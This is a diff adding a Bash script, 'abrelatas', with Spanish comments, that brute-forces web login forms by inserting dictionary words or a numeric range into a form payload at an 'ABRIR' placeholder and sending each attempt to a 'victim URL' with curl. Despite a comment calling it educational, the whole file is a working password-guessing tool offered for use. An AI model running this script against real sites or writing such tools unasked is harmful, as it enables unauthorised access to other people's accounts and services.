@@ -1,0 +1,231 @@
+#!/bin/bash
+
+####################################
+# Creado por cbenitez10
+# Script creado con fines educativos
+# y laborales
+#####################################
+
+VERSION=0.0.1
+
+#Colors
+greenColor="\033[0;32m\033[1m"
+redColor="\033[0;31m\033[1m"
+blueColor="\033[0;34m\033[1m"
+yellowColor="\033[0;33m\033[1m"
+purpleColor="\033[0;35m\033[1m"
+turquoiseColor="\033[0;36m\033[1m"
+grayColor="\033[0;37m\033[1m"
+endColor="\033[0m\033[0m"
+
+usage(){
+  echo -e "${redColor}\n"
+  echo -e "
+  ▄▄▄       ▄▄▄▄    ██▀███  ▓█████  ██▓    ▄▄▄     ▄▄▄█████▓ ▄▄▄        ██████ 
+▒████▄    ▓█████▄ ▓██ ▒ ██▒▓█   ▀ ▓██▒   ▒████▄   ▓  ██▒ ▓▒▒████▄    ▒██    ▒ 
+▒██  ▀█▄  ▒██▒ ▄██▓██ ░▄█ ▒▒███   ▒██░   ▒██  ▀█▄ ▒ ▓██░ ▒░▒██  ▀█▄  ░ ▓██▄   
+░██▄▄▄▄██ ▒██░█▀  ▒██▀▀█▄  ▒▓█  ▄ ▒██░   ░██▄▄▄▄██░ ▓██▓ ░ ░██▄▄▄▄██   ▒   ██▒
+ ▓█   ▓██▒░▓█  ▀█▓░██▓ ▒██▒░▒████▒░██████▒▓█   ▓██▒ ▒██▒ ░  ▓█   ▓██▒▒██████▒▒
+ ▒▒   ▓▒█░░▒▓███▀▒░ ▒▓ ░▒▓░░░ ▒░ ░░ ▒░▓  ░▒▒   ▓▒█░ ▒ ░░    ▒▒   ▓▒█░▒ ▒▓▒ ▒ ░
+  ▒   ▒▒ ░▒░▒   ░   ░▒ ░ ▒░ ░ ░  ░░ ░ ▒  ░ ▒   ▒▒ ░   ░      ▒   ▒▒ ░░ ░▒  ░ ░
+  ░   ▒    ░    ░   ░░   ░    ░     ░ ░    ░   ▒    ░        ░   ▒   ░  ░  ░  
+      ░  ░ ░         ░        ░  ░    ░  ░     ░  ░              ░  ░      ░  
+                ░                                                              \n"
+
+  echo -e "${greenColor}Script de Fuerza Bruta creado por Chris";
+  echo -e "${yellowColor}";
+  echo -e "uso: abrelatas <opcion>"
+	echo
+	echo "Opciones disponibles:"
+	echo "   ayuda        -h     Ayuda sobre opciones y subcomandos."
+  echo
+	echo "   Tipos de ataque:"
+	echo "     rango        -r     Rango de numeros consecutivos para usar como contrasena. Ejemplo: -r 100-200"
+	echo "     diccionario  -d     En lugar de usar el rango utiliza un diccionario de claves."
+	echo
+	echo "     Opciones de ataque:"
+  echo "       url          -u     URL de la victima."
+	echo "       delay        -s     El tiempo en segundos que va a tardar en ejecutar el siguiente ataque."
+	echo "       method       -m     Metodo a utilizar POST por defecto."
+	echo "       payload      -p     El payload que se va a enviar por el metodo."
+	echo "       archivo      -a     Archivo payload en lugar de usar -p."
+	echo "       version      -v     Muestra la version instalada."
+	echo
+	echo -e "${endColor}"
+}
+
+# Controlar la salida
+trap ctrl_c INT
+ctrl_c(){
+	echo -e "\n${redColor}[*] Saliendo...${endColor}"
+	exit 1
+}
+
+# Main function 
+main() {
+  method="POST"
+
+  # Options
+  while getopts "a:d:f:hm:p:r:s:u:v" opt; do
+    case ${opt} in
+      a )
+        payloadFilePath=$OPTARG
+        payloadFile=1
+        ;;
+      d )
+        filePath=$OPTARG
+        typeAttack="dictionary"
+        ;;
+      h )
+        usage
+        exit 1
+        ;;
+      m )
+        if [ $OPTARG != "POST" ]; then
+          method=$OPTARG
+        fi
+        ;;
+      p )
+        payload=$OPTARG
+        ;;
+      r )
+        typeAttack="range"
+        rangeFrom=$(echo $OPTARG | awk -F'-' '{print $1}')
+        rangeTo=$(echo $OPTARG | awk -F'-' '{print $2}')
+        ;;
+      s )
+        delay=$OPTARG
+        ;;
+      u )
+        targetUrl=$OPTARG
+        ;;
+      v )
+        echo "\n${blueColor}[*] Version: ${VERSION}${endColor}"
+        ;;
+      * )
+        usage
+        exit 1
+        ;;
+    esac
+  done
+  shift $((OPTIND -1))
+  
+  sleep 0.5
+
+  startAttack 
+}
+
+# Range attack function
+dictionaryAttack(){
+  local attack=""
+  if [ "$payloadFile" -eq 1 ]; then
+    payload=$(cat $payloadFilePath)
+  fi
+  
+  if [ "$targetUrl" = '' ]; then
+    errorMessage "Se necesita ingresar la url victima"
+  fi
+  
+  if [ "$payload" = '' ]; then
+    errorMessage "El payload es requerido, ejemplo: username=admin&password=ABRIR&token=63asdfuh2uo4h23ny8asdf8"
+  fi
+  
+  if [ ! -f "$filePath" ]; then
+    errorMessage "Debe poner la ruta del archivo"
+  fi
+  
+  echo -e "${greenColor}[*] Iniciando ataque ${endColor}"
+  
+  configHeader
+  payload1=$(echo $payload | awk -F'ABRIR' '{print $1}')
+  payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
+  
+  while read  -r  line; do
+    dataRaw="${payload1}${line}${payload2}"
+    # echo "curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw}"
+    result=$(curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw})
+    echo -e $result
+    setSleep
+  done < $filePath
+  echo -e "${greenColor}[*] Ataque culminado ${endColor}"
+}
+# end Range
+
+# Range attack function
+rangeAttack(){
+  local attack=""
+  if [ "$payloadFile" -eq 1 ]; then
+    payload=$(cat $payloadFilePath)
+  fi
+  
+  if [ "$targetUrl" = '' ]; then
+    errorMessage "Se necesita ingresar la url victima"
+  fi
+  
+  if [ "$payload" = '' ]; then
+    errorMessage "El payload es requerido, ejemplo: username=admin&password=ABRIR&token=63asdfuh2uo4h23ny8asdf8"
+  fi
+  
+  if [ "$rangeFrom" = '' ] || [ "$rangeTo" = '' ]; then
+    errorMessage "Debe ingresar un rango separado por un (-), ejemplo: 100-200"
+  fi
+  
+  echo -e "${greenColor}[*] Iniciando ataque ${endColor}"
+  
+  configHeader 
+  payload1=$(echo $payload | awk -F'ABRIR' '{print $1}')
+  payload2=$(echo $payload | awk -F'ABRIR' '{print $2}')
+  
+  for (( c=$rangeFrom; c<=$rangeTo; c++ )); do
+    dataRaw="${payload1}${c}${payload2}"
+    # echo "curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw}"
+    result=$(curl --silent --request ${method} ${targetUrl} --header ${header} --data-raw ${dataRaw})
+    echo -e $result
+    setSleep  
+  done
+  echo -e "${greenColor}[*] Ataque culminado ${endColor}"
+}
+# end Range
+
+####################
+# error Message
+errorMessage(){
+  echo -e "\n${redColor}[!] $1 ${endColor}\n"
+  exit 1
+}
+
+# config Header
+configHeader(){
+  header="Content-Type: application/x-www-form-urlencoded;charset=UTF-8"
+  verifyPayload=$(echo $payload | python -c "import sys,json;json.loads(sys.stdin.read());print('OK')" 2>/dev/null)
+  if [ "$verifyPayload" = "OK" ]; then
+    header="Content-Type: application/json;charset=UTF-8" 
+  fi
+}
+
+# set Sleep 
+setSleep(){
+  if [ "$delay" = "" ]; then
+    delay=0
+  fi
+  sleep $delay
+}
+#######################
+
+# Start Attack 
+startAttack(){
+  clear;
+
+  case ${typeAttack} in
+    range )
+      rangeAttack
+      ;;
+    dictionary )
+      dictionaryAttack
+      ;;
+  esac
+
+}
+
+# Executor
+main "$@"
